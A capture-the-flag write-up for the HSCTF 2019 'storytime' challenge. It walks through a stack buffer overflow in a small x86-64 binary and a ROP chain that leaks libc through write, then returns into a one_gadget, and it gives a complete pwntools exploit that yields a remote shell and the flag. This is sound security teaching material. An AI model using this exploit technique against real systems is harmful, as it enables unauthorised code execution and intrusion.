# hs 2019 storytime

Let's take a look at the binary:

```
$    file storytime
storytime: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=3f716e7aa7e236824c52ed0410c1f14739919822, not stripped
$    pwn checksec storytime
[*] '/Hackery/hs/storytime/storytime'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$    ./storytime
HSCTF PWNNNNNNNNNNNNNNNNNNNN
Tell me a story:
15935728
```

So we are dealing with a `64` bit dynamically linked binary that has a non-executable stack. When we run it, it prompts us for input. Let's look at the main function in Ghidra:

```
undefined8 main(void)

{
  undefined input [48];
 
  setvbuf(stdout,(char *)0x0,2,0);
  write(1,"HSCTF PWNNNNNNNNNNNNNNNNNNNN\n",0x1d);
  write(1,"Tell me a story: \n",0x12);
  read(0,input,400);
  return 0;
}
```

So we can see that it starts out by printing some data with the `write` function. Proceeding that it will scan in `400` bytes of data into `input` (which can only hold `48` bytes), and give us a buffer overflow. There is no stack canary, so there isn't anything stopping us from executing code. The question is, what will we execute?

Looking under the imports in Ghidra, we can see that our imported functions are `read`, `write`, and `setvbuf`. Since PIE is not enabled, we can call any of these functions. Also since the elf is dynamically linked (and a pretty small binary), we don't have a lot of gadgets. My plan to go about getting a shell has two parts. The first part is getting a libc infoleak with a `write` function that writes to `stdout` (`1`), then loop back again to a vulnerable read call and overwrite the return address with a onedgadget. A onegadget is essentially a single ROP gadget that can be found in the libc, that if the right conditions are meant when it is ran, it will give you a shell (the project for the onegadget finder can be found at: https://github.com/david942j/one_gadget).

The issue with this is we don't know what version of libc is running on a server. For this I looked at what libc version they gave out for other challenges and guessed and checked. After a bit I found that it was libc version `libc.so.6`. However before I did that I got it working locally with my own libc. To see what libc file your binary is loaded with, and where the file is stored, you can just run the `vmmap` command in gdb while the binary is running:

```
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /Hackery/hs/storytime/storytime
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /Hackery/hs/storytime/storytime
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /Hackery/hs/storytime/storytime
0x00007ffff79e4000 0x00007ffff7bcb000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bcb000 0x00007ffff7dcb000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcb000 0x00007ffff7dcf000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd1000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dd1000 0x00007ffff7dd5000 0x0000000000000000 rw-
0x00007ffff7dd5000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fd9000 0x00007ffff7fdb000 0x0000000000000000 rw-
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000027000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000028000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
```

Also the indication I used to see if I had the right libc version (doesn't work 100% of the time), but when I would try and calculate the base of the libc using offsets, it ended with several zeros that would usually be a good indication.

Now back to the exploitation. There are `0x38` bytes between the start of our input and the return address (`48` for the size of the char buffer, and `8` for the saved base pointer). Now for the write libc infoleak we will need the `rdi` register to have the value `0x1` to specify the stdout file handle, `rsi` to have the address of the got entry for write (since that will give us the libc address for write), and `rdx` to have a value greater than or equal to `8` (to leak the address). Also since PIE isn't enabled, we know the address of the got entry without a PIE infoleak. Looking at the assembly code leading up to the `ret` instruction which gives us code execution, we can see that the `rdx` register is set to `0x190` which will fit our needs.

```
        00400684 ba 90 01        MOV        EDX,0x190
                 00 00
        00400689 48 89 c6        MOV        RSI,RAX
        0040068c bf 00 00        MOV        EDI,0x0
                 00 00
        00400691 e8 1a fe        CALL       read                                             ssize_t read(int __fd, void * __
                 ff ff
        00400696 b8 00 00        MOV        EAX,0x0
                 00 00
        0040069b c9              LEAVE
        0040069c c3              RET
```

Now for the got entry of `write` in the `rsi` register, we see that there is a rop gadget that will allow us to pop it into the register. It will also pop a value into the `r15` register, however we just need to include another 8 byte qword in our rop chain for that so it really doesn't affect much:

```
$    python ROPgadget.py --binary storytime | grep rsi
0x0000000000400701 : pop rsi ; pop r15 ; ret
```

For the last register (the `1` in `rdi`) I settled this with where we jumped back to. Instead of calling `write`, I just jumped to `0x400601` which is in the middle of the `end` function:
```

void end(void)

{
  write(1,"The End!\n",0x28);
  return;
}
```

Specifically the instruction we jump back to will mov `0x1` into the `edi` register then call `write`, which will give us our infoleak:
```
        00400606 e8 95 fe        CALL       write                                            ssize_t write(int __fd, void * _
                 ff ff
        0040060b 90              NOP
        0040060c 5d              POP        RBP
        0040060d c3              RET
```

Then it will return and continue on with our rop chain. However before it does that, it will pop a value off of our chain into the `rbp` register so we will need to include a filler 8 byte qword in our rop chain at that point. For where to jump to, I choose `0x40060e`, since it is the beginning of the `climax` function which gives us a buffer overflow where we can overwrite the return address with a onegadget and pop a shell.

```
void climax(void)

{
  undefined local_38 [48];
 
  read(0,local_38,4000);
  return;
}
```

Also to find the onegadget, we can just use the onegaget finder like this to find the offset from the base of libc. To choose which one to use, I normally just guess and check instead of checking the conditions at runtime (I find it a bit faster):

```
$    one_gadget libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

Putting it all together, we get the following exploit. If you want to run it locally with a different version of libc, you can either swap it out with something like `LD_PRELOAD`, or just switch the `libc` variable to point to the libc version you're using. If you do do that, you will also need to update the one_gadget offset too:

```
from pwn import *

# Establisht the target
#target = process('./storytime')
#gdb.attach(target, gdbscript = 'b *0x40060e')
target = remote("pwn.hsctf.com", 3333)

# Establish the libc version
libc = ELF('libc.so.6')
#libc = ELF('libc-2.27.so')


#0x0000000000400701 : pop rsi ; pop r15 ; ret
popRsiR15 = p64(0x400701)

# Got address of write
writeGot = p64(0x601018)

# Filler to reach the return address
payload = "0"*0x38

# Pop the got entry of write into r15
payload += popRsiR15
payload += writeGot
payload += p64(0x3030303030303030) # Filler value will be popped into r15

# Right before write call in end
payload += p64(0x400601)

# Filler value that will be popped off in end
payload += p64(0x3030303030303030)

# Address of climax, we will exploit another buffer overflow to use the rop gadget
payload += p64(0x40060e)

# Send the payload
target.sendline(payload)

# Scan in some of the output
print target.recvuntil("Tell me a story: \n")

# Scan in and filter out the libc infoleak, calculate base of libc
leak = u64(target.recv(8))
base = leak - libc.symbols["write"]
print hex(base)

# Calculate the oneshot gadget
oneshot = base + 0x4526a

# Make the payload for the onshot gadget
payload = "1"*0x38 + p64(oneshot)

# Send it and get a shell
target.sendline(payload)
target.interactive()
```

When we run it:
```
$    python exploit.py
[+] Opening connection to pwn.hsctf.com on port 3333: Done
[*] '/Hackery/hs/storytime/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
HSCTF PWNNNNNNNNNNNNNNNNNNNN
Tell me a story:

0x7fddbba46000
[*] Switching to interactive mode
Pҳ\xbb�\x00\x00p^\xab\xbb�\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \xb6���\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00ls
bin
dev
flag
lib
lib32
lib64
storytime
$ ls
bin
dev
flag
lib
lib32
lib64
storytime
$ cat flag
hsctf{th4nk7_f0r_th3_g00d_st0ry_yay-314879357}
```

Just like that, we captured the flag!
